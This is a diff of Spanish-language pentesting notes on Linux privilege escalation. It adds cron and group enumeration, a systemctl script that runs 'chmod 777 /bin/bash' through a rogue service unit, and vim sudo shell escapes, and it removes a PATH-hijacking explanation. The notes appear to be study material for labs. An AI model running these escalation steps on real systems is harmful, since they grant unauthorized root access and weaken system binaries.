@@ -29,7 +29,22 @@ lsb_release -a
 uname -r
 ```
 
+##### Listar tareas cron
+```bash
+	cat /etc/crontab
+```
 
+##### Comprobar grupos
+A veces nuestro usuario no tiene privilegios, pero si el grupo al que pertenece
+```bash
+id
+find / -group "grupo" 2>/dev/null
+```
+
+##### Buscar capturas de wireshark
+```bash
+find / -name *.pcap* 2>/dev/null
+```
 ### Capabilities
 ```bash
 getcap -r / 2>/dev/null
@@ -91,6 +106,25 @@ y podemos ejecutar comandos del sistema desde less, pero como tenemos permiso SU
 
 y ya somos root
 ```
+
+##### Permiso SUID Systemctl
+al ejecutar este script, estamos dando permiso SUID a "/bin/bash".
+```bash
+#!/bin/bash 
+TF=$(mktemp).service 
+echo '[Service] 
+Type=oneshot 
+ExecStart=/bin/sh -c "chmod 777 /bin/bash" 
+[Install] 
+WantedBy=multi-user.target' > $TF
+/bin/systemctl link $TF
+/bin/systemctl enable --now $TF
+```
+
+Luego ejecutamos una bash y seremos root.
+```bash
+bash -p
+```
 ### SUDO -L
 Si encontramos un binario que con ==sudo -l== vemos que podemos ejecutarlo como si fueramos el administrador, podemos buscar en **GTFOBins**
 
@@ -99,6 +133,19 @@ Si encontramos un binario que con ==sudo -l== vemos que podemos ejecutarlo como 
 Si encontramos vim con sudo -l. Abrimos vim
 ``` bash
 sudo vim -c ':!/bin/sh'
+```
+
+Alternativa:
+```bash
+sudo /usr/bin/vim
+
+Una vez abierto:
+:set shell=/bin/bash
+
+pulsamos INTRO y luego escribimos
+:shell
+
+pulsamos INTRO y ya somos root
 ```
 
 ##### Sudo -L Pkexec
@@ -166,29 +213,8 @@ Herramienta que busca posibles malas configuraciones en la maquina para intentar
 [Pspy](https://github.com/DominicBreuker/pspy)
 Herramienta para monitorizar tareas cron
 
-## PATH Hijacking
-Es una vulnerabilidad que nos permite alterar el funcionamiento normal del sistema para ejecutar binarios que no son lejítimos, como si realmente lo fueran.
+### Escalada privilegios con path hijacking
 
-Supongamos que tenemos un binario que por defecto/mala configuración podemos ejecutar como root, pero no se puede explotar como con **GTFOBins**. Por ejemplo, ____un script que se ejecuta como root, que contiene el comando "ifconfig"___
 
-___También sirve para ese mismo binario si tuviera permisos para ejecutarse como root, se puede secuestrar el path___
-
-Ver la variable de entorno $PATH
-```bash
-echo $PATH
-```
-
-añadir una ruta al $PATH
-```bash
-export PATH=/ruta_que_queramos_añadir:$PATH
-"EJEMPLO"
-export PATH=/home/kali:$PATH
-```
-
-De esta manera, si tenemos un binario en **/home/kali** llamado **ifconfig** cuyo contenido sea el siguiente:
-```bash
-/bin/bash
-``` 
-, al lanzar el script que contiene el comando **ifconfig**, la primera ruta donde buscará en el $PATH, será /home/kali y encontrará nuestro binario malicioso.
 
 
